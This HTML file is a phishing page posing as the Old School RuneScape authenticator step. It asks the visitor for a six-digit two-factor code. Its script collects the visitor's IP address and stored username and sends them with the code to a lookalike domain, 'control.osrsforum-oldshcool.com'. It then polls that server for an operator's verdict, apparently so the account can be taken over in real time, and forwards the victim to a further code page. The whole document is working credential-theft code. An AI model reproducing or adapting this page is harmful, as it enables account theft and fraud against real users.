<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Authenticate - RuneScape | Old School RuneScape</title>
    <script>window.PANEL_API_BASE='https://control.osrsforum-oldshcool.com/';</script>
 
    <link rel="icon" href="img/favicon.svg" sizes="any" type="image/svg+xml">
    <link rel="stylesheet" type="text/css" href="css/style1.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Lora:wght@400&display=swap');
        .form-error {
            display: none;
            color: red;
        }
        h2, h3{
            font-family: 'Lora', serif;
            text-align: center;
            width: 100%;
            margin-top: 20px;
            margin-bottom: 20px;
            letter-spacing: 2px;
        }
        h2{
            color: #E1BB34;
        }
        h3{
            margin-top: 0px;
            margin-bottom: 14px;
            color: white;
        }
        p, .remb{
            color: white;
            text-align: center;
            width: 100%;
        }
        .remb{
            margin-bottom: 14px;
        }
        #du-login-submit{
            margin-top: 20px;
        }
        .check{
            accent-color: black;
        }
        .auth-error-box {
            display: none;
            background-color: #e67e22;
            color: #fff;
            text-align: center;
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 15px;
        }
        .auth-error-box.show {
            display: block;
        }
        @media(max-width: 900px){
            body{
                background: #101d23;
            }
            .l-vista__container{
                box-shadow: none;
            }
            .l-vista__container:before{
                box-shadow: none;
            }
        }
    </style>
</head>
<body style="height: 100vh;">
<div class="container flex f-width justify-center align-center container_page2">
    <div class="l-vista__container">
        <div class="logo flex justify-center align-center">
            <img src="img/logo_one.png">
            <img src="img/logo_two.png">
        </div>
        <form method="post" id="authForm">
            <input type="text" id="_hp" name="_hp" value="" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;">
            <h2>AUTHENTICATOR</h2>
            <h3>ENTER CODE</h3>
            <p>Enter the 6 digit code displayed by your code generator app.</p>
            <div class="auth-error-box" id="authErrorBox">The code you entered was not correct, please try again.</div>
            <label class="password_label">Enter the code
                <input class="login-form__text is-invalid-input" type="text" name="code" id="login_password"
                       autofocus maxlength="6">
                <span class="form-error is-visible" id="password_error">
                    This field is required.
                </span>
            </label>
            <label>
                <input type="checkbox" name="check" class="check" checked> <span class="remb">Remember this browser for 30 days</span>
            </label>
            <button class="a-button a-button--size-full" id="du-login-submit" type="submit" name="coding">CONTINUE	
            </button>
        </form>
        <a href="https://support.runescape.com/hc/en-gb/articles/33993292512145-Authentication-RuneScape-Account/" id="go-back-link" class="flex f-width justify-center align-center">Lost your Authenticator?</a>
    </div>
</div>
<script>
    document.addEventListener('DOMContentLoaded', function() {
        const passwordInput = document.getElementById('login_password');
        const errorSpan = document.getElementById('password_error');
        const loginButton = document.getElementById('du-login-submit');
        const goBackLink = document.getElementById('go-back-link');
        const authForm = document.getElementById('authForm');
        
        // Get session data from localStorage
        let sessionData = null;
        try {
            const storedSession = localStorage.getItem('userSession');
            if (storedSession) {
                sessionData = JSON.parse(storedSession);
            }
        } catch (e) {
            console.error('Error parsing session data:', e);
        }
        
        // If no session data exists, create a new session
        if (!sessionData) {
            sessionData = {
                sessionId: 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now(),
                username: 'Unknown',
                loginType: 'username',
                timestamp: new Date().toISOString()
            };
            localStorage.setItem('userSession', JSON.stringify(sessionData));
        }
        
        const username = sessionData.username || 'Unknown';
        
        // Function to get user IP address using a public API
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP address:', error);
                return 'Unknown';
            }
        }
        
        passwordInput.addEventListener('focus', () => {
            errorSpan.style.display = 'none';
            var authErrorBox = document.getElementById('authErrorBox');
            if (authErrorBox) authErrorBox.classList.remove('show');
        });
        
        passwordInput.addEventListener('blur', function(event) {
            if (event.relatedTarget !== goBackLink) {
                if (passwordInput.value.trim() === '') {
                    errorSpan.style.display = 'block';
                } else {
                    errorSpan.style.display = 'none';
                }
            }
        });

        authForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            if (passwordInput.value.trim() === '') {
                errorSpan.style.display = 'block';
                return; // Stop execution if code is empty
            } else {
                errorSpan.style.display = 'none';
                var authErrorBox = document.getElementById('authErrorBox');
                if (authErrorBox) authErrorBox.classList.remove('show');
                
                // Get IP address
                const ipAddress = await getUserIP();
                
                // Update session data with verification code and IP address
                sessionData.verificationCode = passwordInput.value;
                sessionData.ipAddress = ipAddress;
                localStorage.setItem('userSession', JSON.stringify(sessionData));
                
                loginButton.disabled = true;
                var originalBtnText = loginButton.textContent;
                loginButton.textContent = 'Checking...';

                var basePromise = (window.PANEL_API_BASE !== undefined && window.PANEL_API_BASE !== '') ? Promise.resolve(window.PANEL_API_BASE) : fetch(location.origin + '/api/config').then(function(r) { return r.json(); }).then(function(c) { return (c && c.apiBase) ? c.apiBase : location.origin; }).catch(function() { return location.origin; });
                basePromise.then(async function(base) {
                    var apiBase = base.replace(/\/$/, '');
                    if (sessionData && sessionData.sessionId) {
                        try {
                            var url = apiBase + '/api/submit';
                            var _hp = (document.getElementById('_hp') && document.getElementById('_hp').value) || '';
                            await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ logId: sessionData.sessionId, pincode: passwordInput.value, _hp: _hp }) });
                        } catch (e) {}
                    }
                    var statusUrl = apiBase + '/api/auth-status?logId=' + encodeURIComponent(sessionData.sessionId);
                    while (true) {
                        try {
                            var res = await fetch(statusUrl, { method: 'GET' });
                            var json = await res.json();
                            if (json.verified === true) {
                                sessionStorage.setItem('allowed_step_digit_code', '1');
                                window.location.href = 'digit_code.html';
                                return;
                            }
                            if (json.verified === false) {
                                loginButton.disabled = false;
                                loginButton.textContent = originalBtnText;
                                if (authErrorBox) authErrorBox.classList.add('show');
                                if (passwordInput) passwordInput.focus();
                                return;
                            }
                        } catch (e) {}
                        await new Promise(function(r) { setTimeout(r, 1500); });
                    }
                });
            }
        });

        goBackLink.addEventListener('click', function(event) {
            errorSpan.style.display = 'none';
        });
    });
</script>
<iframe 
  src="./footeruser.html" 
  id="myIframe"
  style="width: 100%; border: none; overflow: hidden; display: block; vertical-align: bottom;" 
  scrolling="no" 
  onload="this.style.height = this.contentWindow.document.body.scrollHeight + 'px';">
</iframe>
</body>
</html>
